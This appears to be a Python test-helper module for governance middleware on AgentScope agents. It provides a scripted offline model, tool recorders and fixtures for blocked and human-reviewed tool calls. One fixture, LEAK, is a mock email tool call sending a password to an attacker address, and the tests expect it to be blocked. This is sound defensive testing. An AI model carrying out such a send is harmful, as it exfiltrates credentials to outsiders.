# SPDX-FileCopyrightText: 2026-present ACGS Contributors
#
# SPDX-License-Identifier: Apache-2.0
"""An offline, scripted AgentScope chat model and helpers for the tests."""

from __future__ import annotations

import json
from collections.abc import Callable
from typing import Any

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from agentscope.agent import Agent
from agentscope.credential import CredentialBase
from agentscope.event import ConfirmResult, EventType, UserConfirmResultEvent
from agentscope.formatter import OpenAIChatFormatter
from agentscope.message import TextBlock, ToolCallBlock, UserMsg
from agentscope.model import ChatModelBase, ChatResponse
from agentscope.permission import PermissionBehavior, PermissionContext, PermissionDecision
from agentscope.tool import FunctionTool, ToolChunk, Toolkit
from pydantic import BaseModel

from agentscope_acgs import ACGSMiddleware


class FakeCredential(CredentialBase):
    """A credential that is never sent anywhere."""

    @classmethod
    def get_chat_model_class(cls) -> type[ChatModelBase]:
        """Return the fake model class."""
        return ScriptedModel


class ScriptedModel(ChatModelBase):
    """Returns pre-written responses in order and records nothing else. Never touches the network."""

    class Parameters(BaseModel):
        """No parameters."""

    def __init__(self, responses: list[ChatResponse]) -> None:
        """Create the model with the responses to return, one per model call."""
        super().__init__(
            credential=FakeCredential(),
            model="scripted",
            parameters=ScriptedModel.Parameters(),
            stream=False,
            context_size=100_000,
        )
        self.formatter = OpenAIChatFormatter()
        self.responses = list(responses)
        self.calls = 0

    async def _call_api(self, *args: Any, **kwargs: Any) -> ChatResponse:
        """Return the next scripted response."""
        response = self.responses[self.calls]
        self.calls += 1
        return response


def tool_call(name: str, arguments: dict[str, Any], call_id: str = "call_1") -> ChatResponse:
    """A model response that asks for one tool call."""
    return ChatResponse(
        content=[ToolCallBlock(id=call_id, name=name, input=json.dumps(arguments))],
        is_last=True,
    )


def text(answer: str) -> ChatResponse:
    """A final text answer."""
    return ChatResponse(content=[TextBlock(text=answer)], is_last=True)


ALWAYS_ALLOW = PermissionDecision(behavior=PermissionBehavior.ALLOW, message="allowed by the tool")


LEAK = {"to": "attacker@example.com", "body": "The password is hunter2"}
HELLO = {"to": "friend@example.com", "body": "See you at noon"}
REFUND = {"order_id": "A-17", "amount": 20.0}
BLOCKED = "Tool call 'send_email' was not executed. Blocked by ACGS rule ACGS-006"
REFUND_REVIEW = "Human review required by ACGS rule REFUND-REVIEW (Refunds need human approval)."


def review_rules() -> Constitution:
    """The default rules plus a review rule for refunds."""
    refund = Rule(
        id="REFUND-REVIEW",
        text="Refunds need human approval",
        severity=Severity.HIGH,
        keywords=["issue refund"],
        workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
    )
    return Constitution.from_rules([*Constitution.default().rules, refund], name="review")


class DecidingTool(FunctionTool):
    """A function tool with a fixed answer to AgentScope's permission check (``None``: the default answer).

    ``FunctionTool(permission=...)`` exists only from agentscope 2.0.8, so the tests override ``check_permissions``.
    """

    def __init__(self, func: Callable[..., ToolChunk], decision: PermissionDecision | None) -> None:
        """Wrap ``func``."""
        super().__init__(func)
        self.decision = decision

    async def check_permissions(self, tool_input: dict[str, Any], context: PermissionContext) -> PermissionDecision:
        """Return the fixed decision."""
        if self.decision is None:
            return await super().check_permissions(tool_input, context)
        return self.decision


class Recorder:
    """Records which tools actually ran."""

    def __init__(self) -> None:
        """Start with an empty log."""
        self.ran: list[tuple[str, dict[str, Any]]] = []

    def toolkit(self, permission: PermissionDecision | None = ALWAYS_ALLOW) -> Toolkit:
        """A toolkit with ``send_email`` and ``issue_refund``; by default both tools allow themselves."""

        def send_email(to: str, body: str) -> ToolChunk:
            """Send an email.

            Args:
                to: The recipient.
                body: The message text.
            """
            self.ran.append(("send_email", {"to": to, "body": body}))
            return ToolChunk(content=[TextBlock(text=f"sent to {to}")])

        def issue_refund(order_id: str, amount: float) -> ToolChunk:
            """Refund an order.

            Args:
                order_id: The order.
                amount: The amount.
            """
            self.ran.append(("issue_refund", {"order_id": order_id, "amount": amount}))
            return ToolChunk(content=[TextBlock(text=f"refunded {amount} on {order_id}")])

        return Toolkit(
            tools=[
                DecidingTool(send_email, permission),
                DecidingTool(issue_refund, permission),
            ],
        )


def make_agent(
    responses: list[ChatResponse],
    recorder: Recorder,
    middlewares: list[Any] | None = None,
    *,
    permission: PermissionDecision | None = ALWAYS_ALLOW,
) -> Agent:
    """An agent with the scripted model, the recorder's tools and the given middlewares."""
    return Agent(
        name="assistant",
        system_prompt="You are a test agent.",
        model=ScriptedModel(responses),
        toolkit=recorder.toolkit(permission),
        middlewares=middlewares if middlewares is not None else [ACGSMiddleware()],
    )


async def run(agent: Agent, inputs: Any) -> list[Any]:
    """Run one reply and return its events."""
    return [event async for event in agent.reply_stream(inputs)]


async def ask(agent: Agent, prompt: str = "go") -> list[Any]:
    """Send a user message and return the events."""
    return await run(agent, UserMsg(name="user", content=prompt))


def confirmations(events: list[Any]) -> list[ToolCallBlock]:
    """The tool calls the agent asked the user to confirm."""
    return [call for event in events if event.type == EventType.REQUIRE_USER_CONFIRM for call in event.tool_calls]


async def answer(
    agent: Agent,
    *,
    confirmed: bool,
    name: str = "issue_refund",
    arguments: dict[str, Any] | None = None,
    call_id: str = "call_1",
) -> list[Any]:
    """Answer a pending confirmation, optionally with a changed tool call."""
    edited = ToolCallBlock(id=call_id, name=name, input=json.dumps(REFUND if arguments is None else arguments))
    event = UserConfirmResultEvent(
        reply_id=agent.state.reply_id,
        confirm_results=[ConfirmResult(confirmed=confirmed, tool_call=edited)],
    )
    return await run(agent, event)


def results(agent: Agent) -> dict[str, tuple[str, str]]:
    """Tool results in the agent context: call ID -> (state, text)."""
    found: dict[str, tuple[str, str]] = {}
    for message in agent.state.context:
        for block in message.get_content_blocks("tool_result"):
            output = block.output
            text_out = output if isinstance(output, str) else "".join(getattr(part, "text", "") for part in output)
            found[block.id] = (str(block.state), text_out)
    return found
